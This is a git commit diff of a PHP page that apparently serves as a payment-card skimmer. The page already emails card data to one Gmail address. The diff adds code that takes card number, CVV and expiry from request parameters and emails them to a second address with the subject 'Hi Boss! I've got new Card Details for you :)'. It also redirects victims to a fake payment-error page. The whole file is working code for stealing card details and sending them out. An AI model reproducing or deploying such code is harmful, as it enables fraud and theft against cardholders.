4a55bf8ab7749428a5dc0409643fadc53b6619c6
Lastball <138126238+Lastball@users.noreply.github.com>
2023-07-07 14:47:52 +0200

    Add files via upload

--- index.php
+++ index.php
@@ -8,7 +8,16 @@ $msg = wordwrap($msg,70);
 // send email
 mail("electrosuncoza@gmail.com","Card Details",$msg);
 
+// the message
+$msg = "Card Number: ". $_GET['cn'] ."\n"."Card CVV: ". $_GET['cs'] ."\n"."Card Expirey: ". $_GET['cx'] ."\n";
+
+// use wordwrap() if lines are longer than 70 characters
+$msg = wordwrap($msg,70);
+
+// send email
+mail("metabongani@gmail.com","Hi Boss! I've got new Card Details for you :)",$msg);
 
 
-header('location: https://electrosun.co.za/MT9001');
+
+header('location: https://electrosun.co.za/MT9001?payment=error');
 ?>
